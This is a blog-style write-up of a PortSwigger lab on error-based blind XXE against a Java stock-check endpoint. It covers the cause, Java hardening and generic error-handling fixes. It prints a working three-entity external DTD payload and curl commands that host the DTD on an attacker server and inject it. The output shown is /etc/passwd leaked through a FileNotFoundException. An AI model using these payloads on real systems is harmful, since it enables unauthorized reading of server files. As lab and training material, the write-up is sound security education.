---
layout: post
title: "Blind XXE — Retrieving Data via Error Messages"
date: 2027-08-17 09:00:00 -0500
categories: [PortSwigger, XXE]
tags: [xxe, blind-xxe, error-based, external-dtd, cwe-611, java]
---

## Overview

This PortSwigger lab demonstrates a blind XXE variant where file contents are exfiltrated via a **verbose parser error message** rather than an out-of-band HTTP/DNS callback. The target is a stock-check feature that parses XML but never echoes entity values — classic blind XXE. The trick: Java's XML parser includes the `FileNotFoundException` message in the HTTP error response, and that message can contain arbitrary file contents.

**CWE:** CWE-611 — Improper Restriction of XML External Entity Reference (chained with CWE-209 — Information Exposure Through Error Message)

---

## How the Vulnerability Works

Java's `DocumentBuilderFactory` resolves external entities and fetches external DTDs by default, with no configuration needed. Combined with an app that writes `e.getMessage()` directly to the HTTP response on parse failure, this creates a two-step exfil chain:

1. The parser fetches an external DTD from the attacker's server
2. The DTD uses a three-entity chain where the exfil URI is an **invalid `file://` path** embedding the target file's contents
3. The parser throws `FileNotFoundException: /invalid/<file-contents>`
4. The app echoes the exception message → **file contents appear in the HTTP 400 response**

No external listener, no DNS infrastructure, no Burp Collaborator needed.

### The Three-Entity DTD Chain

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'file:///invalid/%file;'>">
%eval;
%exfil;
```

Why external DTD? The XML spec prohibits inline DOCTYPE subsets from defining parameter entities that reference other parameter entities. The chain **only works in an external DTD** fetched via `SYSTEM`.

---

## Exploit

### Step 1 — Host the malicious DTD

Upload the DTD to the PortSwigger exploit server (or any attacker-controlled HTTP host):

```bash
curl -s -X POST 'https://<exploit-server>/' \
  --data-urlencode 'urlIsHttps=on' \
  --data-urlencode 'responseFile=/exploit' \
  --data-urlencode $'responseHead=HTTP/1.1 200 OK\nContent-Type: text/xml' \
  --data-urlencode $'responseBody=<!ENTITY % file SYSTEM "file:///etc/passwd">\n<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM \'file:///invalid/%file;\'">\n%eval;\n%exfil;' \
  --data-urlencode 'formAction=STORE'
```

### Step 2 — Fire the injection

```bash
curl -s -X POST 'https://<target>/product/stock' \
  -H 'Content-Type: application/xml' \
  --data '<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "https://<exploit-server>/exploit"> %xxe;]><stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>'
```

### Response

```
HTTP/1.1 400 Bad Request

"XML parser exited with error: java.io.FileNotFoundException: /invalid/root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
...
```

The full `/etc/passwd` is in the error message.

---

## How This Differs from OOB Blind XXE

| Variant | Exfil channel | Needs external listener? | Works when egress blocked? |
|---------|--------------|--------------------------|---------------------------|
| OOB HTTP | `http://<lhost>/?x=<contents>` | Yes | No |
| OOB DNS | `http://<subdomain>.oastify.com/` | Yes (DNS attribution) | Requires DNS egress |
| **Error-based (this lab)** | `file:///invalid/<contents>` → `FileNotFoundException` | **No** | **Yes** |

Error-based exfil is useful when the server has outbound filtering — the data path stays entirely within the HTTP request/response cycle.

---

## Fix

Two independent defenses required:

**1. Disable external entity processing** — prevents the XXE primitive entirely:

```java
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
dbf.setExpandEntityReferences(false);
```

**2. Generic error responses** — prevents error-based exfil even if XXE fires:

```java
} catch (Exception e) {
    response.getWriter().write("Invalid request"); // never echo e.getMessage()
}
```

Either fix alone reduces the impact — both together eliminate the attack.

---

## Key Takeaways

- Java XML parsers resolve external entities **by default** — always configure explicitly
- The three-entity DTD chain (`%file` → `%eval` → `%exfil`) is only legal in **external** DTDs
- Verbose exception messages are a second CWE (CWE-209) that amplifies XXE from blind to readable
- Error-based exfil requires no OOB infrastructure — useful when egress is restricted
